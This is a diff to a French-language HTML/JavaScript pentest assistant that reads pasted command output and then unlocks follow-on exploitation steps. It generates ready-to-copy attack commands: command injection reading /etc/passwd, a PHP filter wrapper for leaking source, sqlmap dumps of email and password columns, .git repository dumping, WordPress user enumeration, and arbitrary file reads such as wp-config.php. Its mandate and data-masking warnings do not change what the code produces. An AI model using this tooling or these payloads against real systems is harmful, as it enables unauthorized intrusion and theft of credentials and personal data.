@@ -34,7 +34,17 @@
   footer{color:#6b7280;font-size:11px;text-align:center;margin:16px 0 4px}
   .hidden{display:none}
   .scorebox{display:flex;align-items:center;gap:14px;flex-wrap:wrap;margin:8px 0}.score{font-size:40px;font-weight:900}
-  @media print{body{background:#fff;color:#000}.toolbar,.go,.cat{display:none}}
+  .analyse{margin-top:9px;border-top:1px dashed rgba(255,255,255,.12);padding-top:9px}
+  .analyse textarea.res{min-height:64px}
+  .mini{margin-top:6px;padding:7px 13px;font-size:12px;background:#22304a;color:#cfe}
+  .verdict{margin-top:9px;font-size:13px;line-height:1.5}
+  .verdict.ok{color:#22c55e;font-weight:600}.verdict.bad{color:#ef4444}.verdict.warn{color:#f59e0b}
+  .followup{margin-top:9px;border-left:3px solid var(--or);padding-left:11px}
+  .followup .fh{font-size:11px;text-transform:uppercase;letter-spacing:1px;color:var(--or);font-weight:800;margin:0 0 5px}
+  .step.sub{background:#0a0c11;border-color:rgba(230,169,60,.25)}
+  .danger{font-size:11.5px;color:#ffb4a0;background:#2a1218;border:1px solid #4a2230;border-radius:6px;padding:7px 10px;margin-top:7px}
+  #reportBanner{display:none;background:#0e2a18;border:1px solid #1f5a37;color:#8ef0b5;border-radius:8px;padding:9px 12px;margin:0 0 12px;font-size:13px}
+  @media print{body{background:#fff;color:#000}.toolbar,.go,.cat,.mini,.analyse textarea{display:none}}
 </style>
 </head>
 <body>
@@ -55,8 +65,30 @@
   <div id="out" class="hidden">
     <div class="toolbar"><button onclick="copyAll()">📋 Tout copier</button><button onclick="window.print()">🖨️ Imprimer / PDF</button></div>
     <h2>① Route à suivre (dans l'ordre)</h2>
+    <p class="sub" style="margin-top:-4px">Sous chaque commande : colle la sortie → <b>« Analyser »</b> → l'assistant lit ce que tu as trouvé et débloque la suite adaptée.</p>
     <div id="steps"></div>
 
+    <div id="extract" class="panel hidden">
+      <h2 style="margin-top:0">③ Entrer dans la base / extraire (selon le client)</h2>
+      <div id="extract_sqli" class="hidden">
+        <p class="exp">💉 SQLi confirmée — tu peux entrer dans la base. Cible une donnée précise du client. <b>Jamais toute la base : 1 échantillon MASQUÉ suffit comme preuve.</b></p>
+        <div class="row">
+          <div><label>Base</label><input id="ex_db" placeholder="nom_base"></div>
+          <div><label>Table</label><input id="ex_table" placeholder="users / clients / commandes"></div>
+        </div>
+        <label>Colonnes à extraire (séparées par une virgule)</label><input id="ex_cols" placeholder="email,password,nom">
+        <button class="go" onclick="genSqlDump()">🎯 Générer la commande d'extraction ciblée</button>
+        <div id="ex_out"></div>
+      </div>
+      <div id="extract_file" class="hidden">
+        <p class="exp">📄 Lecture de fichier confirmée. Indique le fichier à extraire selon le client (config, identifiants, données…).</p>
+        <label>Chemin du fichier</label><input id="ex_file" placeholder="/var/www/html/wp-config.php">
+        <button class="go" onclick="genFileRead()">📄 Générer la commande de lecture</button>
+        <div id="ex_out2"></div>
+      </div>
+    </div>
+
+    <div id="reportBanner">✅ <b>Rapport pré-rempli automatiquement</b> d'après ce que tu as trouvé — descends, vérifie/édite les sections, puis « Assembler le rapport complet ».</div>
     <h2>② Générer le rapport <span style="font-size:12px;color:#9aa0b0">(bug bounty OU audit client — même procédé que Doctolib / kalelia)</span></h2>
     <div class="panel">
       <div class="row">
@@ -199,16 +231,21 @@ auth:[
 ]
 };}
 
+var AGT={U:'',T:'',P:'id'}, FCNT=0;
 function gen(){
   var c=clean(document.getElementById('cible').value); if(!c.host){alert("Entre une cible.");return;}
   var T=c.host, U=(/^\d+\.\d+\.\d+\.\d+$/.test(T)?('http://'+T):('https://'+T));
   var P=(document.getElementById('param').value.trim()||'id');
+  AGT={U:U,T:T,P:P};
   var pb=PB(U,T,P), order=['recon','disco','infra','rce','sqli','lfi','xss','idor','ssrf','upload','xxe','ssti','auth'];
   var html='', i=0;
   order.forEach(function(k){ if(!sel[k]||!pb[k])return; var cat=CATS.filter(function(x){return x.k===k;})[0];
     html+='<div class="ph">'+esc(cat.n)+'</div>';
     pb[k].forEach(function(s){ var id='c'+(i++);
-      html+='<div class="step"><h3>'+esc(s.t)+'</h3><pre><button class="copy" onclick="cp(\''+id+'\',this)">📋 Copier</button><code id="'+id+'">'+esc(s.c)+'</code></pre><div class="exp">'+s.e+'</div></div>';
+      html+='<div class="step"><h3>'+esc(s.t)+'</h3><pre><button class="copy" onclick="cp(\''+id+'\',this)">📋 Copier</button><code id="'+id+'">'+esc(s.c)+'</code></pre><div class="exp">'+s.e+'</div>'+
+        '<div class="analyse"><textarea class="res" id="res_'+id+'" placeholder="Colle ici la sortie de cette commande…"></textarea>'+
+        '<button class="mini" onclick="analyzeStep(\''+id+'\')">▶ Analyser le résultat</button>'+
+        '<div class="verdict" id="verd_'+id+'"></div></div></div>';
     });
   });
   if(!html){alert("Choisis au moins un type (Recon est coché par défaut).");return;}
@@ -320,6 +357,92 @@ function report(){
   document.getElementById('result').scrollIntoView({behavior:'smooth'});
 }
 function cpv(btn){var t=btn.parentNode.querySelector('code').innerText;navigator.clipboard.writeText(t).then(function(){btn.classList.add('done');btn.textContent='✓ Copié';setTimeout(function(){btn.classList.remove('done');btn.textContent='📋 Copier';},1400);});}
+/* ===================== MOTEUR ADAPTATIF : lire la sortie -> débloquer la suite ===================== */
+function scan(t){
+  var U=AGT.U||'https://cible', P=AGT.P||'id';
+  // RCE (uid=… gid=…)
+  if(/uid=\d+.*gid=\d+/i.test(t)) return {cls:'ok',msg:'💥 RCE CONFIRMÉE — tu exécutes des commandes sur le serveur (uid=… présent).',
+    follow:[{t:'Lire un fichier (preuve)',c:'curl -s "'+U+'/?'+P+'=x;cat /etc/passwd"',e:'Preuve de lecture serveur. Pour un fichier CLIENT précis → panneau ③ ci-dessus.'}],
+    report:{type:'rce',payload:'x;id'}, unlock:'file'};
+  // LFI (/etc/passwd)
+  if(/root:x:0:0:/.test(t)) return {cls:'ok',msg:'💥 LFI CONFIRMÉE — /etc/passwd lu via l\'inclusion de fichier.',
+    follow:[{t:'Lire le code source (wrapper PHP)',c:'curl -s "'+U+'/?'+P+'=php://filter/convert.base64-encode/resource=index"',e:'Décode le base64 → identifiants de la base, secrets.'}],
+    report:{type:'lfi',payload:'../../../../etc/passwd'}, unlock:'file'};
+  // SQLi (sqlmap)
+  if(/is vulnerable|available databases|back-end DBMS|sqlmap identified|Parameter:.*\((GET|POST)\)/i.test(t)) return {cls:'ok',msg:'💉 SQLi CONFIRMÉE — tu peux entrer dans la base. Panneau ③ ouvert ci-dessus.',
+    follow:[{t:'Lister les tables d\'une base',c:'sqlmap -u "'+U+'/?'+P+'=1" -p '+P+' --batch -D <base> --tables',e:'Repère la table clients/users, puis extrais dans le panneau ③.'}],
+    report:{type:'sqli',payload:"1' OR '1'='1"}, unlock:'sqli'};
+  // Write non-auth (kalelia / Rank Math)
+  if(/\{"slug":"\/","schemas":\[\]\}/.test(t) || (/\b200\b/.test(t) && /rank_math|updateMeta|objectID/i.test(t))) return {cls:'ok',msg:'🖊️ WRITE NON AUTHENTIFIÉ confirmé (changement accepté sans login). Preuve de modification.',
+    follow:[], report:{type:'bac'}, unlock:null};
+  // Énumération de compte (Doctolib)
+  if(/account_exists|"exists"\s*:\s*(true|false)/i.test(t)) return {cls:'ok',msg:'🔎 ÉNUMÉRATION DE COMPTE confirmée (oracle existe / n\'existe pas, sans auth).',
+    follow:[], report:{type:'enum'}, unlock:null};
+  // .git exposé
+  if(/ref:\s*refs\/heads|\.git\/HEAD[\s\S]{0,40}\b200\b|\b200\b[\s\S]{0,40}\.git/i.test(t)) return {cls:'ok',msg:'📂 Dépôt .git EXPOSÉ → récupération du code source + secrets.',
+    follow:[{t:'Aspirer le .git + chercher des secrets',c:'git-dumper '+U+'/.git/ ./loot && gitleaks detect -s ./loot',e:'Sous mandat ; au coffre, ne pas diffuser le code.'}],
+    report:{type:'info'}, unlock:null};
+  // WordPress détecté
+  if(/wordpress/i.test(t)) return {cls:'ok',msg:'🧩 WordPress détecté → énumère comptes + plugins vulnérables.',
+    follow:[{t:'Énumérer WordPress (wpscan)',c:'wpscan --url '+U+' --enumerate u,vp,vt --random-user-agent',e:'Comptes + plugins/thèmes à CVE.'},
+            {t:'Comptes via REST',c:'curl -s '+U+'/wp-json/wp/v2/users',e:'Fuite de comptes fréquente.'}],
+    report:null, unlock:null};
+  // chemins trouvés (ffuf / codes HTTP)
+  if(/\bStatus:\s*(200|301|302|401|403)\b/i.test(t) || /\b(20\d|30\d|401|403)\b\s+\S+\s+\S+\s+\/\S+/.test(t)) return {cls:'ok',msg:'🗂️ Chemins trouvés — vise les pages sensibles (admin, login, backup, .sql, .zip, .git).',
+    follow:[], report:null, unlock:null};
+  // en-têtes / techno
+  if(/Server:\s|X-Powered-By:|X-Generator:/i.test(t)) return {cls:'warn',msg:'ℹ️ Techno / en-têtes identifiés. Continue l\'énumération (étapes suivantes).',follow:[],report:null,unlock:null};
+  return {cls:'warn',msg:'Rien d\'exploitable détecté ici — passe à l\'étape suivante (ou colle une autre sortie).',follow:[],report:null,unlock:null};
+}
+function analyzeStep(id){
+  var box=document.getElementById('res_'+id), v=document.getElementById('verd_'+id);
+  var txt=box?box.value:'';
+  if(!txt.trim()){ v.className='verdict warn'; v.innerHTML='Colle d\'abord la sortie de la commande, puis clique Analyser.'; return; }
+  var r=scan(txt);
+  v.className='verdict '+r.cls;
+  var h=esc(r.msg);
+  if(r.follow&&r.follow.length){
+    h+='<div class="followup"><div class="fh">→ Étapes débloquées :</div>';
+    r.follow.forEach(function(s){ var fid='f'+(FCNT++);
+      h+='<div class="step sub"><h3>'+esc(s.t)+'</h3><pre><button class="copy" onclick="cp(\''+fid+'\',this)">📋 Copier</button><code id="'+fid+'">'+esc(s.c)+'</code></pre><div class="exp">'+s.e+'</div></div>';
+    });
+    h+='</div>';
+  }
+  v.innerHTML=h;
+  if(r.unlock) showExtract(r.unlock);
+  if(r.report) applyToReport(r.report, txt);
+}
+function applyToReport(rep, txt){
+  if(rep.type){ setv('rtype', rep.type); }
+  if(rep.payload){ setv('rpayload', rep.payload); }
+  if(txt){ setv('rproof', txt.slice(0,1500)); }
+  fillSkeleton(true);
+  var b=document.getElementById('reportBanner'); if(b) b.style.display='block';
+}
+function showExtract(mode){
+  var wrap=document.getElementById('extract'); wrap.classList.remove('hidden');
+  if(mode==='sqli') document.getElementById('extract_sqli').classList.remove('hidden');
+  if(mode==='file') document.getElementById('extract_file').classList.remove('hidden');
+}
+function genSqlDump(){
+  var db=fv('ex_db')||'<base>', tb=fv('ex_table')||'<table>', cols=fv('ex_cols');
+  var cmd='sqlmap -u "'+AGT.U+'/?'+AGT.P+'=1" -p '+AGT.P+' --batch -D '+db+' -T '+tb+(cols?(' -C '+cols):'')+' --dump --start 1 --stop 1';
+  document.getElementById('ex_out').innerHTML='<pre><button class="copy" onclick="cp(\'exq\',this)">📋 Copier</button><code id="exq">'+esc(cmd)+'</code></pre>'+
+    '<div class="danger">RGPD / déonto : <b>--start 1 --stop 1 = 1 seule ligne</b>, à MASQUER (ex. <code>j***@***.com</code>). Jamais toute la base. Preuve au coffre uniquement.</div>';
+  setv('rtype','sqli'); if(!fv('rpayload')) setv('rpayload',"1' OR '1'='1"); fillSkeleton(true);
+  var b=document.getElementById('reportBanner'); if(b) b.style.display='block';
+}
+function genFileRead(){
+  var f=fv('ex_file')||'/etc/passwd';
+  var lfi='curl -s "'+AGT.U+'/?'+AGT.P+'='+f+'"';
+  var rce='curl -s "'+AGT.U+'/?'+AGT.P+'=x;cat '+f+'"';
+  document.getElementById('ex_out2').innerHTML=
+    '<div class="ph">Si LFI (inclusion de fichier)</div><pre><button class="copy" onclick="cp(\'exf1\',this)">📋 Copier</button><code id="exf1">'+esc(lfi)+'</code></pre>'+
+    '<div class="ph">Si RCE (exécution de commande)</div><pre><button class="copy" onclick="cp(\'exf2\',this)">📋 Copier</button><code id="exf2">'+esc(rce)+'</code></pre>'+
+    '<div class="danger">Sous mandat uniquement. Contenu sensible (identifiants, données perso) = MASQUER dans le rapport, au coffre.</div>';
+  setv('rproof', f+' → (colle ici la sortie masquée)'); fillSkeleton(true);
+  var b=document.getElementById('reportBanner'); if(b) b.style.display='block';
+}
 document.getElementById('cible').addEventListener('keydown',function(e){if(e.key==='Enter')gen();});
 </script>
 </body>
